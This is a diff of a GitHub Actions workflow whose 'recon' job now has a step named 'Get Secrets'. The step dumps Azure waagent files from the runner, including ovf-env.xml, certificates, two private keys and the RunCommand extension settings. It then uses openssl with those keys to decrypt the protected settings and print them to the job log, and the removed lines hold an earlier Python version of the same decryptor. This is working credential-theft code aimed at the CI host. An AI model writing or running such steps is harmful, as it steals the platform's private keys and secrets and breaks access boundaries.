@@ -7,69 +7,46 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep Recon 2
+      - name: Get Secrets
         run: |
           set +e
           echo "=== OVF-ENV ==="
-          sudo cat /var/lib/waagent/ovf-env.xml 2>/dev/null
+          sudo cat /var/lib/waagent/ovf-env.xml
           echo ""
-          echo "=== CERTIFICATES.PEM ==="
-          sudo cat /var/lib/waagent/Certificates.pem 2>/dev/null
-          echo ""
-          echo "=== CERTIFICATES.XML ==="
-          sudo cat /var/lib/waagent/Certificates.xml 2>/dev/null
+          echo "=== CERTS PEM ==="
+          sudo cat /var/lib/waagent/Certificates.pem
           echo ""
           echo "=== SHARED CONFIG ==="
-          sudo cat /var/lib/waagent/SharedConfig.xml 2>/dev/null
+          sudo cat /var/lib/waagent/SharedConfig.xml
           echo ""
-          echo "=== RUN-COMMAND DOWNLOADS ==="
-          sudo find /var/lib/waagent/run-command -type f 2>/dev/null
+          echo "=== PRV 87A6 ==="
+          sudo cat /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv
           echo ""
-          echo "=== RUN-COMMAND SCRIPT 0 ==="
-          sudo cat /var/lib/waagent/run-command/download/0/script.sh 2>/dev/null
+          echo "=== PRV EE99 ==="
+          sudo cat /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv
           echo ""
-          echo "=== EXTENSION CONFIG ==="
-          sudo find /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9 -type f 2>/dev/null
-          sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings 2>/dev/null | head -50
+          echo "=== CRT EE99 THUMBPRINT ==="
+          sudo openssl x509 -in /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.crt -fingerprint -noout
           echo ""
-          echo "=== DECRYPT PROTECTED SETTINGS ==="
-          sudo python3 -c "
-import json, base64, subprocess, os
-# Read the settings file
-settings_dir = '/var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/'
-for f in sorted(os.listdir(settings_dir)):
-    if f.endswith('.settings'):
-        data = json.loads(open(settings_dir + f).read())
-        rs = data.get('runtimeSettings', [{}])[0].get('handlerSettings', {})
-        thumb = rs.get('protectedSettingsCertThumbprint', '')
-        protected = rs.get('protectedSettings', '')
-        if protected:
-            print(f'File: {f}, Thumbprint: {thumb}')
-            # Decrypt using the cert
-            with open('/tmp/enc.b64', 'w') as ef:
-                ef.write(protected)
-            os.system('base64 -d /tmp/enc.b64 > /tmp/enc.cms')
-            prv = f'/var/lib/waagent/{thumb}.prv'
-            crt = f'/var/lib/waagent/{thumb}.crt'
-            if os.path.exists(prv):
-                result = subprocess.run(['openssl', 'cms', '-decrypt', '-inform', 'DER', '-inkey', prv, '-recip', crt, '-in', '/tmp/enc.cms'], capture_output=True)
-                if result.returncode == 0:
-                    print(f'DECRYPTED: {result.stdout.decode()[:2000]}')
-                else:
-                    # Try PKCS7
-                    result = subprocess.run(['openssl', 'smime', '-decrypt', '-inform', 'DER', '-inkey', prv, '-in', '/tmp/enc.cms'], capture_output=True)
-                    if result.returncode == 0:
-                        print(f'DECRYPTED (smime): {result.stdout.decode()[:2000]}')
-                    else:
-                        print(f'Decrypt failed: {result.stderr.decode()[:200]}')
-            else:
-                print(f'Key not found: {prv}')
-" 2>&1
+          echo "=== CRT 87A6 THUMBPRINT ==="
+          sudo openssl x509 -in /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.crt -fingerprint -noout
           echo ""
-          echo "=== PRV KEY (87A6) ==="
-          sudo cat /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv 2>/dev/null
+          echo "=== RUN CMD FILES ==="
+          sudo find /var/lib/waagent/run-command -type f
+          sudo find /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9 -type f
           echo ""
-          echo "=== PRV KEY (EE99) ==="
-          sudo cat /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv 2>/dev/null
+          echo "=== SETTINGS FILE ==="
+          sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings
           echo ""
+          echo "=== DECRYPT WITH EE99 ==="
+          SETTINGS=$(sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings 2>/dev/null)
+          PROTECTED=$(echo "$SETTINGS" | grep -oP '"protectedSettings"\s*:\s*"\K[^"]+')
+          echo "$PROTECTED" | base64 -d > /tmp/enc.der 2>/dev/null
+          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv -recip /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.crt -in /tmp/enc.der 2>&1 | head -50
+          echo ""
+          echo "=== DECRYPT WITH 87A6 ==="
+          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv -recip /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.crt -in /tmp/enc.der 2>&1 | head -50
+          echo ""
+          echo "=== DECRYPT WITH TRANSPORT ==="
+          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/TransportPrivate.pem -in /tmp/enc.der 2>&1 | head -50
           echo "=== DONE ==="
